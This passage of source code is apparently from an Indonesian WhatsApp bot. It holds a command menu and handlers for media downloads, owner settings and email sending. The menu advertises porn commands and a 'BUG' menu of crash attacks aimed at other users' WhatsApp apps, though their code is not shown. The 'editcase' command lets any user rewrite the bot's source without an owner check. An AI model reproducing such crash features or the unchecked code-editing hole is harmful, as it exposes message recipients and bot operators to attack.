       ─ ᴄᴀᴛᴍᴇᴏ 
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ ASUPAN - MENU ] 乂${yy1}
───────────────
       ─ ᴛɪᴋᴛᴏᴋɢɪʀʟ
       ─ ᴛɪᴋᴛᴏᴋɴᴜᴋᴛʜʏ
       ─ ᴛɪᴋᴛᴏᴋᴋᴀʏᴇꜱ
       ─ ᴛɪᴋᴛᴏᴋᴘᴀɴʀɪᴋᴀ
       ─ ᴛɪᴋᴛᴏᴋɴᴏᴛɴᴏᴛ
       ─ ᴛɪᴋᴛᴏᴋɢʜᴇᴀ
       ─ ᴛɪᴋᴛᴏᴋꜱᴀɴᴛᴜʏ
       ─ ᴛɪᴋᴛᴏᴋʙᴏᴄɪʟ
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ BOKEP - MENU ] 乂${yy1}
───────────────
       ─ ʙᴏᴋᴇᴘ1
       ─ ʙᴏᴋᴇᴘ2
       ─ ʙᴏᴋᴇᴘ3
       ─ ʙᴏᴋᴇᴘ4
       ─ ʙᴏᴋᴇᴘ5
       ─ ʙᴏᴋᴇᴘ6
       ─ ʙᴏᴋᴇᴘ7
       ─ ʙᴏᴋᴇᴘ8
       ─ ʙᴏᴋᴇᴘ9
       ─ ʙᴏᴋᴇᴘ10
       ─ ʙᴏᴋᴇᴘ11
       ─ ʙᴏᴋᴇᴘ12
       ─ ʙᴏᴋᴇᴘ13
       ─ ʙᴏᴋᴇᴘ14
       ─ ʙᴏᴋᴇᴘ15
       ─ ʙᴏᴋᴇᴘ16
       ─ ʙᴏᴋᴇᴘ17
       ─ ʙᴏᴋᴇᴘ18

⏤͟͟͞͞──────────────────
${yy1}乂 [ CERPEN - MENU ] 乂${yy1}
───────────────
       ─ ᴄᴇʀᴘᴇɴ ᴀɴᴀᴋ
       ─ ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀᴅᴀᴇʀᴀʜ
       ─ ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀɪɴɢɢʀɪꜱ
       ─ ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀᴊᴀᴡᴀ
       ─ ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀꜱᴜɴᴅᴀ
       ─ ᴄᴇʀᴘᴇɴ ʙᴜᴅᴀʏᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀɪꜱʟᴀᴍɪ
       ─ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀᴘᴇʀᴛᴀᴍᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀʀᴏᴍᴀɴᴛɪꜱ
       ─ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇᴅɪʜ
       ─ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇɢɪᴛɪɢᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇᴊᴀᴛɪ
       ─ ᴄᴇʀᴘᴇɴ ɢᴀʟᴀᴜ
       ─ ᴄᴇʀᴘᴇɴ ɢᴏᴋɪʟ
       ─ ᴄᴇʀᴘᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ
       ─ ᴄᴇʀᴘᴇɴ ᴊᴇᴘᴀɴɢ
       ─ ᴄᴇʀᴘᴇɴ ᴋᴇʜɪᴅᴜᴘᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴋᴇʟᴜᴀʀɢᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴋɪꜱᴀʜɴʏᴀᴛᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴋᴏʀᴇᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴋʀɪꜱᴛᴇɴ
       ─ ᴄᴇʀᴘᴇɴ ʟɪʙᴜʀᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴍᴀʟᴀʏꜱɪᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴍᴇɴɢʜᴀʀᴜᴋᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴍɪꜱᴛᴇʀɪ
       ─ ᴄᴇʀᴘᴇɴ ᴍᴏᴛɪᴠᴀꜱɪ
       ─ ᴄᴇʀᴘᴇɴ ɴᴀꜱɪʜᴀᴛ
       ─ ᴄᴇʀᴘᴇɴ ᴏʟᴀʜʀᴀɢᴀ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴀᴛᴀʜʜᴀᴛɪ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇɴᴀɴᴛɪᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇɴᴅɪᴅɪᴋᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇɴɢᴀʟᴀᴍᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇɴɢᴏʀʙᴀɴᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇɴʏᴇꜱᴀʟᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇʀᴊᴜᴀɴɢᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇʀᴘɪꜱᴀʜᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇʀꜱᴀʜᴀʙᴀᴛᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ᴘᴇᴛᴜᴀʟᴀɴɢᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ʀᴀᴍᴀᴅʜᴀɴ
       ─ ᴄᴇʀᴘᴇɴ ʀᴇᴍᴀᴊᴀ
       ─ ᴄᴇʀᴘᴇɴ ʀɪɴᴅᴜ
       ─ ᴄᴇʀᴘᴇɴ ʀᴏʜᴀɴɪ
       ─ ᴄᴇʀᴘᴇɴ ʀᴏᴍᴀɴᴛɪꜱ
       ─ ᴄᴇʀᴘᴇɴ ꜱᴀꜱᴛʀᴀ
       ─ ᴄᴇʀᴘᴇɴ ꜱᴇᴅɪʜ
       ─ ᴄᴇʀᴘᴇɴ ꜱᴇᴊᴀʀᴀʜ

⏤͟͟͞͞──────────────────
${yy1}乂 [ MUSIC - MENU ] 乂${yy1}
───────────────
       ─ ᴍᴜꜱɪᴄ1 sᴀᴍᴘᴀɪ ᴍᴜꜱɪᴄ𝟾𝟻
       ─ sᴀᴅ𝟷 sᴀᴍᴘᴀɪ 𝟹𝟻
       ─ sᴏᴜɴᴅ𝟷 sᴀᴍᴘᴀɪ 𝟷𝟼𝟷

⏤͟͟͞͞──────────────────
${yy1}乂 [ BUG - MENU ] 乂${yy1}
───────────────
       ─ ᴠᴀʟɪᴅᴀᴛᴏʀ-ᴄʀᴀsʜ 
       ─ ᴠᴀʟɪᴅᴀᴛᴏʀ-ᴜɪ 
       ─ sʏsᴛᴇᴍ-ᴄʀᴀsʜ 
       ─ sʏsᴛᴇᴍ-ᴜɪ 
       ─ xᴅᴏ-ᴄʀᴀsʜ 
       ─ xᴅᴏ-ᴜɪ 
       ─ xᴅᴏ-sʏsᴛᴇ 
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ METHODE - MENU ] 乂${yy1}
───────────────
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ1 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ2 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ3 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ4 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ5 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ6 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ7 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ8 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ9 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ10 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ11 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ12 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ13 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ14 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ15 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ16 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ17 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ18  
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ19 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ20 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴠ21 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍᴠ1 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍᴠ2 
       ─ ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍᴠ3 
              
       
${yy1}ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴋʏʏxᴅ${yy1}
`
Kyyhst.sendMessage(m.chat, {
    video: {url: "https://files.catbox.moe/5rsgz2.jpg"},
    caption: anj,
    gifPlayback: true,
contextInfo: {
    mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
	forwardingScore: 10,
	isForwarded: true,
    forwardedNewsletterMessageInfo: {
	newsletterJid: '120363405649403674@newsletter',
	serverMessageId: null,
	newsletterName: 'Chanel Info || Akame - AI', 
						},
externalAdReply: {
        showAdAttribution: true, 
        title: `Akame - AI || Beta`,
        body: "Created By KyyXD",
        thumbnailUrl: "https://files.catbox.moe/lslvq4.jpg",
        sourceUrl: "https://youtube.com/KyyHost",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   }, { quoted: m })
}
await Kyyhst.sendMessage(m.chat, {audio: fs.readFileSync('./system/suara/allmenu.mp3'), viewOnce: false, mimetype:'audio/mpeg', ptt: true}, {quoted: m})
break





//============================================================\\
     // 𝗢 𝗪 𝗡 𝗘 𝗥        -             𝗠 𝗘 𝗡 𝗨 \\
///============================================================\\
case 'self': {
if (!isCreator) return tolakk(mess.OnlyOwner)
global.public = false
m.reply('Sukses Change To Self Mode')
}
break

case 'public': {
if (!isCreator) return tolakk(mess.OnlyOwner)
global.public = true
m.reply('Sukses Change To Public Mode')
}
break

   case 'readchange': case 'autoread':{
if (!isCreator) return reply(mess.OnlyOwner) 
if (args.length < 1) return reply(`Contoh ${prefix + command} on/off`)
if (q === 'on') {
global.autoread = true
m.reply(`Berhasil mengubah autoread ke ${q}`)
} else if (q === 'off') {
global.autoread = false
m.reply(`Berhasil mengubah autoread ke ${q}`)
}
}
break
case "leave": {
if (!isCreator) return reply(mess.OnlyOwner)
if (!m.isGroup) return reply(mess.OnlyGrup)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await Kyyhst.groupLeave(m.chat)
}
break
case "joingc": case "join": {
if (!isCreator) return reply(mess.OnlyOwner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await Kyyhst.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

case 'addcase': {
 if (!isCreator) return reply('lu sapa asu')
 if (!text) return reply('Mana case nya');
    const fs = require('fs');
const namaFile = 'case.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan.');
            }
        });
    } else {
        reply('Tidak dapat menambahkan case dalam file.');
    }
});

}
break
case 'editcase': {
 if (!text) return reply(`Contoh penggunaan: ${prefix + command} <nama_case> | <isi_case_baru>`);
 let [caseName, ...newContentArr] = text.split('|');
 caseName = caseName.trim();
 let newContent = newContentArr.join('|').trim();
 if (!caseName || !newContent) {
 return reply('Format salah! Gunakan format: .editcase <nama_case> | <isi_case_baru>');
 }
 const fs = require('fs');
 const filePath = './case.js';
 try {
 if (!fs.existsSync(filePath)) {
 return reply(`File bot tidak ditemukan.`);
 }
 let fileContent = fs.readFileSync(filePath, 'utf-8');
 const regex = new RegExp(`case ['"]${caseName}['"]: {([\\s\\S]*?)}\\s*break;`, 'g');
 if (!regex.test(fileContent)) {
 return reply(`Case *${caseName}* tidak ditemukan.`);
 }
 const updatedFileContent = fileContent.replace(regex, `case '${caseName}': {\n${newContent}\n}\nbreak`);
 fs.writeFileSync(filePath, updatedFileContent, 'utf-8');
 reply(`Case *${caseName}* berhasil diedit.`);
 } catch (error) {
 console.error('Error:', error);
 return reply('Terjadi kesalahan saat mengedit case. Coba lagi nanti.');
 }
}
break;
case 'getcase':
if (!isCreator) return reply(mess.OnlyOwner)
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("case.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
reply(`${getCase(q)}`)
break
 case 'lemonmail': case 'sendemail': {
 if (!isCreator) return reply(mess.OnlyOwner)
 const args = text.split('|'); if (args.length < 3) return m.reply('Format salah! Gunakan: email|subject|pesan');
const [target, subject, message] = args;
        m.reply('Mengirim email...');
        try {
            const data = JSON.stringify({ "to": target.trim(), "subject": subject.trim(), "message": message.trim() });
            const config = {
                method: 'POST',
                url: 'https://lemon-email.vercel.app/send-email',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
                    'Content-Type': 'application/json',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                    'sec-ch-ua-mobile': '?1',
                    'origin': 'https://lemon-email.vercel.app',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://lemon-email.vercel.app/',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i'
                },
                data: data
            };
            const axios = require('axios');
            const api = await axios.request(config);
            m.reply(`Hasil: ${JSON.stringify(api.data, null, 2)}`);
        } catch (error) {
            m.reply(`Error: ${error.message}`);
        }
        }
        break
case 'addprem':{
if (!isCreator) return reply(mess.OnlyOwner)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return reply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return reply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
} else {
var cekap = await Kyyhst.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
}}
break
case 'delprem': {
if (!isCreator) return reply(mess.OnlyOwner)
if (!args[0]) return reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
premium.splice(prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply('Sukses!')
} else {
var cekpr = await Kyyhst.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
premium.splice(prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply('Sukses!')
}}
break

/* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/







//============================================================\\
    // 𝗗 𝗢 𝗪 𝗡 𝗟 𝗢 𝗔 𝗗       -         𝗠 𝗘 𝗡 𝗨
//============================================================\\
case 'tiktok':
case 'tt': {
Kyyhst.sendMessage(from, {
		react: {
			text: "🌊",
			key: m.key
		}
	})
  if (!text) return m.reply(`Contoh: ${prefix + command} link`);
  reply(mess.wait);
      try {
    const data = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(budy)}`);
    const stats = data.result.statistics;
const caption = `𝗗 𝗢 𝗪 𝗡 𝗟 𝗢 𝗔 𝗗 𝗘 𝗥 - 𝗧 𝗜 𝗞 𝗧 𝗢 𝗞\n*Author*: ${data.result.author.nickname}\n*Like*: ${data.result.statistics.likeCount}\n*Komentar*: ${data.result.statistics.commentCount}\n*Share*: ${data.result.statistics.shareCount}\n*Title*: ${data.result.desc}\n\n_Download By ${global.botname}_`;
    const vidnya = data.result.video;
    Kyyhst.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m });
} catch (error) {
    const anub = await fetchJson(`${api.xterm.url}/api/downloader/tiktok?url=${url}&key=${api.xterm.key}`);
    const syavid = anub.data.video;
    Kyyhst.sendMessage(m.chat, { caption: mess.success, video: { url: syavid } }, { quoted: m });
}
}
        break
case 'tiktokv2':
case 'ttv2': {
if (args.length == 0) return m.reply(`Example: ${prefix + command} Harap Berikan Link Nya`)
let res = await tiktok2(`${text}`)
				Kyyhst.sendMessage(m.chat, { video: { url: res.no_watermark }, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
				
                    Kyyhst.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
			})
}
        break
case 'gitclone': {
if (!text) return reply("https://github.com/kiuur/case")
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Kyyhst.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await reply(`Error! Repositori Tidak Ditemukan`)
}}
break
case 'get': {
    if (!isCreator) return reply('*Owner only*');
    if (!text) return reply(`Please start the *URL* with http:// or https://`);
    try {
        const gt = await axios.get(text, {
            headers: {
                "Access-Control-Allow-Origin": "*",
                "Referer": "https://www.google.com/",
                "Referrer-Policy": "strict-origin-when-cross-origin",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
            },
            responseType: 'arraybuffer'
        });
        const contentType = gt.headers['content-type'];
        console.log(`Content-Type: ${contentType}`);

        if (/json/i.test(contentType)) {
            const jsonData = JSON.parse(Buffer.from(gt.data, 'binary').toString('utf8'));
            return reply(JSON.stringify(jsonData, null, 2));
        } else if (/text/i.test(contentType)) {
            const textData = Buffer.from(gt.data, 'binary').toString('utf8');
            return reply(textData);
        } else if (text.includes('webp')) {
            return Kyyhst.sendMessage(m.chat, { sticker: { url: text }}, { quoted: m });
        } else if (/image/i.test(contentType)) {
            return Kyyhst.sendMessage(m.chat, { image: { url: text }}, { quoted: m });
        } else if (/video/i.test(contentType)) {
            return Kyyhst.sendMessage(m.chat, { video: { url: text }}, { quoted: m });
        } else if (/audio/i.test(contentType) || text.includes(".mp3")) {
            return Kyyhst.sendMessage(m.chat, { audio: { url: text }}, { quoted: m });
        } else if (/application\/zip/i.test(contentType) || /application\/x-zip-compressed/i.test(contentType)) {
            return Kyyhst.sendMessage(m.chat, { document: { url: text }}, { quoted: m });
        } else if (/application\/pdf/i.test(contentType)) {
            return Kyyhst.sendMessage(m.chat, { document: { url: text }}, { quoted: m });
        } else {
            return reply(`MIME : ${contentType}\n\n${gt.data}`);
        }
    } catch (error) {
        console.error(`Error: ${error}`);
        return reply(`An error occurred while accessing the URL: ${error.message}`);
    }
}
break;
case "ytmp3":
  if (!q.includes("youtube.com") && !q.includes("youtu.be")) return m.reply("Masukin link YouTube yang valid!");
  let [link, quality] = q.split(",");
  let qualityOptions = ["64kbps", "128kbps", "192kbps", "256kbps", "320kbps"];
  if (!quality) {
    let qualityList = qualityOptions.map(q => `▫️ ${q}`).join("\n");
    return m.reply(
      `🔊 *Pilih kualitas audio yang diinginkan:*\n\n${qualityList}\n\nGunakan format: *ytmp3 linkyt,kualitas*\nContoh: *ytmp3 ${link},320kbps*`
    );
  }
  if (!qualityOptions.includes(quality)) return m.reply(
    `⚠️ *Kualitas tidak valid! Pilih salah satu kualitas berikut:*\n\n${qualityOptions.map(q => `▫️ ${q}`).join("\n")}\n\nGunakan format: *ytmp3 linkyt,kualitas*\nContoh: *ytmp3 ${link},320kbps*`
  );
  let apiUrl = `https://fastrestapis.fasturl.cloud/downup/ytmp3?url=${encodeURIComponent(link)}&quality=${quality}&server=auto`;
  m.reply("Tunggu sebentar, lagi proses download...");
  try {
    let res = await fetch(apiUrl);
    let data = await res.json();
    if (data.status !== 200) return m.reply("Gagal mengambil audio. Coba lagi nanti!");
    let { title, metadata, author, url, media } = data.result;
    let caption = `🎵 *Judul:* ${title}\n📌 *Durasi:* ${metadata.duration}\n👤 *Channel:* ${author.name}\n📆 *Upload:* ${metadata.uploadDate}\n🎶 *Kualitas:* ${quality}\n🔗 *Link:* ${url}`;
    Kyyhst.sendMessage(m.chat, { 
      audio: { url: media }, 
      mimetype: "audio/mp4", 
      fileName: `${title}.mp3`
    }, { quoted: m });
    m.reply(caption);
  } catch (e) {
    console.error(e);
    m.reply("Terjadi kesalahan, coba lagi nanti!");
  }
  break
  
  case "ytmp4":
  if (!q.includes("youtube.com") && !q.includes("youtu.be")) return m.reply("Masukin link YouTube yang valid!");
  let [linkk, qualityy] = q.split(",");
  let qualityyOptions = ["144p", "240p", "360p", "480p", "720p", "1080p"];
  if (!qualityy) {
    let qualityyList = qualityyOptions.map(q => `▫️ ${q}`).join("\n");
    return m.reply(
      `📺 *Pilih kualitas video yang diinginkan:*\n\n${qualityyList}\n\nGunakan format: *ytmp4 linkyt,kualitas*\nContoh: *ytmp4 ${linkk},720p*`
    );
  }
  if (!qualityyOptions.includes(qualityy)) return m.reply(
    `⚠️ *Kualitas tidak valid! Pilih salah satu kualitas berikut:*\n\n${qualityyOptions.map(q => `▫️ ${q}`).join("\n")}\n\nGunakan format: *ytmp4 linkyt,kualitas*\nContoh: *ytmp4 ${linkk},720p*`
  );
  let apiUrll = `https://fastrestapis.fasturl.cloud/downup/ytmp4?url=${encodeURIComponent(linkk)}&quality=${qualityy}&server=auto`;
  m.reply("Tunggu sebentar, lagi proses download...");
  try {
    let res = await fetch(apiUrll);
    let data = await res.json();
    if (data.status !== 200) return m.reply("Gagal mengambil video. Coba lagi nanti!");
    let { title, metadata, author, url, media } = data.result;
    let caption = `📹 *Judul:* ${title}\n📌 *Durasi:* ${metadata.duration}\n👤 *Channel:* ${author.name}\n📆 *Upload:* ${metadata.uploadDate}\n🎞 *Kualitas:* ${qualityy}\n🔗 *Link:* ${url}`;
    Kyyhst.sendMessage(m.chat, { 
      video: { url: media }, 
      mimetype: "video/mp4", 
      fileName: `${title}.mp4`
    }, { quoted: m });
    m.reply(caption);
  } catch (e) {
    console.error(e);
    m.reply("Terjadi kesalahan, coba lagi nanti!");
  }
  break
case 'play': case 'yts': {
 
if (!text) return reply("dj tiktok")
await Kyyhst.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]
var anu = await ytdl.ytmp3(`${res.url}`)
if (anu.status) {
let urlMp3 = anu.download.url
await Kyyhst.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return reply("Error! Result Not Found")
}
await Kyyhst.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case 'tiktoksearch': {
    if (!text) return m.reply("⚠️ Masukkan kata kunci pencarian!\n\nContoh: `.tiktoksearch tobrut besar`");

    try {
        await Kyyhst.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

        const apiUrl = `https://www.velyn.biz.id/api/search/tiktoksearch?query=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);

        if (!data || !data.status || !data.data.length) {
            return m.reply("❌ Tidak ditemukan hasil untuk pencarian tersebut.");
        }

        let totalResults = data.data.length;
        await Kyyhst.sendMessage(m.chat, { text: `🔍 *Ditemukan ${totalResults} video TikTok* untuk pencarian: *${text}*` });

        for (let vid of data.data) {
            let caption = `🎬 *Judul:* ${vid.title}\n`;
            caption += `🔗 *Link:* ${vid.link}\n`;
            caption += `👁️ *Views:* ${vid.views}\n`;
            caption += `❤️ *Likes:* ${vid.likes}\n`;
            caption += `💬 *Comments:* ${vid.comments}\n`;
            caption += `📤 *Shares:* ${vid.shares}\n`;
            caption += `📥 *Downloads:* ${vid.downloads}\n\n`;

            let videoUrl = vid.no_watermark || vid.watermark;

            await Kyyhst.sendMessage(m.chat, { video: { url: videoUrl }, caption }, { quoted: m });
        }

        await Kyyhst.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (error) {
        console.error(error);
        m.reply("⚠️ Terjadi kesalahan, coba lagi nanti.");
    }
}
break;
case 'tt3': case 'tiktok3': {
    if (!args[0]) return m.reply('❌ Harap masukkan URL TikTok!');

    let url = args[0].trim();
    
    try {
        await Kyyhst.sendMessage(m.chat, {
            react: { text: "⏱️", key: m.key }
        });

        let axios = require("axios");
        let apiUrl = `https://api.agatz.xyz/api/tiktok?url=${encodeURIComponent(url)}`;
        let { data } = await axios.get(apiUrl);

        if (!data.status) return m.reply('❌ Gagal mengambil video!');

        let result = data.data;
        let caption = `
🎥 *TikTok Video*
📌 *Judul:* ${result.title}
⏱️ *Durasi:* ${result.duration}
📆 *Diunggah:* ${result.taken_at}
🌍 *Region:* ${result.region}

👤 *Pembuat Konten:*
- Nama: ${result.author.fullname} (@${result.author.nickname})
- Avatar: ${result.author.avatar}

🎶 *Musik:*
- Judul: ${result.music_info.title}
- Artis: ${result.music_info.author}
- Link Musik: ${result.music_info.url}

📊 *Statistik:*
👁️ *Views:* ${result.stats.views}
👍 *Likes:* ${result.stats.likes}
💬 *Komentar:* ${result.stats.comment}
📤 *Shares:* ${result.stats.share}
⬇️ *Unduhan:* ${result.stats.download}
        `.trim();

        // Pilih video kualitas terbaik
        let videoUrl = result.data.find(v => v.type === "nowatermark_hd")?.url || 
                       result.data.find(v => v.type === "nowatermark")?.url ||
                       result.data.find(v => v.type === "watermark")?.url;

        if (!videoUrl) return m.reply('❌ Video tidak ditemukan.');

        // Kirim video + external reply untuk cover
        await Kyyhst.sendMessage(m.chat, {
            video: { url: videoUrl },
            caption: caption,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: result.title,
                    body: "TikTok Downloader",
                    mediaType: 1,
                    thumbnailUrl: result.cover,
                    sourceUrl: url
                }
            }
        }, { quoted: m });

        // Kirim audio jika ada
        if (result.music_info.url) {
            await Kyyhst.sendMessage(m.chat, {
                audio: { url: result.music_info.url },
                mimetype: 'audio/mpeg',
                fileName: `${result.music_info.title}.mp3`
            }, { quoted: m });
        }

        await Kyyhst.sendMessage(m.chat, {
            react: { text: "✅", key: m.key }
        });

    } catch (err) {
        console.error("[TikTok Scraper Error]", err);
        m.reply('❌ Terjadi kesalahan saat memproses permintaan.');
    }
}
break;
case 'instagram': 
case 'ig':
case 'igdl': 
case 'igmp4': {
    const mediaUrl = await igdl(text);
    const url_media = mediaUrl[0].url;
    try {
        const response = await axios.head(url_media); 
        const contentType = response.headers['content-type']; // Mendapatkan tipe konten dari header
        if (contentType.startsWith('image/')) {
            await Kyyhst.sendMessage(m.chat, { image: { url: url_media}, caption: mess.success }, { quoted: m });
            return
        } else {
            await Kyyhst.sendMessage(m.chat, { video: { url: url_media}, caption: mess.success }, { quoted: m });
            return 
        }
    } catch(e) {
        return reply(`Maaf Kak Gagal`)
    }
}
break
case 'yts': case 'ytsearch': {
if (!q) return m.reply("Mau Cari Apa?")
async function ytSearch(q) {
  try {
    const response = await axios.get(`https://www.archive-ui.biz.id/search/youtube?q=${encodeURIComponent(q)}`)

    if (response.data.status && response.data.result.length > 0) {
      let hasilnye = response.data.result.map(video => 
        `- Title: ${video.title}\n- Link: ${video.link}\n- Duration: ${video.duration}\n`
      ).join("\n")
      m.reply("*[ HASIL SEARCH ]*\n\n" + hasilnye)
    } else {
      m.reply("Tidak Ada Hasil")
    }
  } catch (error) {
    m.reply("Error: " + error)
  }
}

